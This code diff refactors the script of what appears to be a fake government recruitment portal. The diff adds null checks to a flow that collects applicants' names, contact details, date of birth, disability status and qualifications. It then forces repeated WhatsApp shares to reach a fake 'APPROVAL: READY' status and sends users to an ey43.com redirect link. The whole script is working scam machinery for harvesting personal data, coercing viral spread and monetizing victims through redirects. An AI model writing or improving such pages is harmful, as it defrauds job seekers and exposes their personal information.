@@ -578,7 +578,6 @@ location.href='https://rebrand.ly/Agric-Zm-Recruitment-2026';
     const applyNowBtn = document.getElementById('applyNowBtn');
     const applicationForm = document.getElementById('applicationForm');
     const proceedBtn = document.getElementById('proceedBtn');
-    const formError = document.getElementById('formError');
     const whatsappBtn = document.getElementById('whatsappBtn');
     const progressFill = document.getElementById('progressFill');
     const progressText = document.getElementById('progressText');
@@ -590,12 +589,19 @@ location.href='https://rebrand.ly/Agric-Zm-Recruitment-2026';
     const whatsappMessage = 'Hello, applications are now open on the Electoral Commission Recruitment Portal. Apply now using this link: https://example.com';
 
     function showStep(nextStep) {
-      [step1, step2, step3].forEach(step => step.classList.remove('active'));
-      nextStep.classList.add('active');
+      [step1, step2, step3].forEach(function (step) {
+        if (step) step.classList.remove('active');
+      });
+      if (nextStep) nextStep.classList.add('active');
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
     function showLoading(callback) {
+      if (!loadingOverlay) {
+        callback();
+        return;
+      }
+
       loadingOverlay.classList.add('show');
       setTimeout(function () {
         loadingOverlay.classList.remove('show');
@@ -603,70 +609,95 @@ location.href='https://rebrand.ly/Agric-Zm-Recruitment-2026';
       }, 1200);
     }
 
-    applyNowBtn.addEventListener('click', function () {
-      formOverlay.style.display = 'none';
-      applicationForm.classList.remove('locked');
-    });
-
-    proceedBtn.addEventListener("click", function () {
-      const fields = [
-        document.getElementById("fullName"),
-        document.getElementById("email"),
-        document.getElementById("phone"),
-        document.getElementById("position"),
-        document.getElementById("dob"),
-        document.getElementById("county"),
-        document.getElementById("disability"),
-        document.getElementById("qualification")
-      ];
-
-      let isValid = true;
-
-      fields.forEach(function (field) {
-        if (!field || !field.value || field.value.trim() === "") {
-          isValid = false;
-        }
+    if (applyNowBtn) {
+      applyNowBtn.addEventListener('click', function () {
+        if (formOverlay) formOverlay.style.display = 'none';
+        if (applicationForm) applicationForm.classList.remove('locked');
       });
+    }
 
-      if (!isValid) {
-  return;
-}
+    if (proceedBtn) {
+      proceedBtn.addEventListener('click', function () {
+        const fields = [
+          'fullName',
+          'email',
+          'phone',
+          'position',
+          'dob',
+          'county',
+          'disability',
+          'qualification'
+        ];
 
-      showLoading(function () {
-        showStep(step2);
-      });
-    });
+        let isValid = true;
 
-    whatsappBtn.addEventListener('click', function (e) {
-      e.preventDefault();
+        fields.forEach(function (id) {
+          const field = document.getElementById(id);
 
-      if (shareClicks < maxClicks) {
-        shareClicks += 1;
-        const progress = Math.round((shareClicks / maxClicks) * 100);
-        progressFill.style.width = progress + '%';
-        progressText.textContent = progress + '%';
+          if (!field) {
+            console.log('Field not found:', id);
+            isValid = false;
+            return;
+          }
 
-        if (shareClicks >= maxClicks) {
-          approvalBox.classList.add('ready');
-          approvalBox.textContent = 'APPROVAL: READY';
-          showLoading(function () {
-            showStep(step3);
-          });
+          const value = String(field.value || '').trim();
+
+          if (value === '') {
+            console.log('Field empty:', id);
+            isValid = false;
+          }
+        });
+
+        if (!isValid) {
+          return;
         }
-      }
 
-      const appLink = 'whatsapp://send?text=' + encodeURIComponent(whatsappMessage);
-      const fallbackLink = 'https://wa.me/?text=' + encodeURIComponent(whatsappMessage);
-      window.location.href = appLink;
-      setTimeout(function () {
-        window.open(fallbackLink, '_blank');
-      }, 1200);
-    });
+        showLoading(function () {
+          showStep(step2);
+        });
+      });
+    }
 
-    retryBtn.addEventListener('click', function () {
-      window.open('https://ey43.com/4/9120968');
-      window.location.href = 'https://ey43.com/4/9120968';
-    });
+    if (whatsappBtn) {
+      whatsappBtn.addEventListener('click', function (e) {
+        e.preventDefault();
+
+        if (shareClicks < maxClicks) {
+          shareClicks += 1;
+          const progress = Math.round((shareClicks / maxClicks) * 100);
+
+          if (progressFill) progressFill.style.width = progress + '%';
+          if (progressText) progressText.textContent = progress + '%';
+
+          if (shareClicks >= maxClicks) {
+            if (approvalBox) {
+              approvalBox.classList.add('ready');
+              approvalBox.textContent = 'APPROVAL: READY';
+            }
+
+            showLoading(function () {
+              showStep(step3);
+            });
+          }
+        }
+
+        const appLink = 'whatsapp://send?text=' + encodeURIComponent(whatsappMessage);
+        const fallbackLink = 'https://wa.me/?text=' + encodeURIComponent(whatsappMessage);
+
+        window.location.href = appLink;
+
+        setTimeout(function () {
+          window.open(fallbackLink, '_blank');
+        }, 1200);
+      });
+    }
+
+    if (retryBtn) {
+      retryBtn.addEventListener('click', function () {
+        window.open('https://ey43.com/4/9120968');
+        window.location.href = 'https://ey43.com/4/9120968';
+      });
+    }
   });
 </script>
 </body>
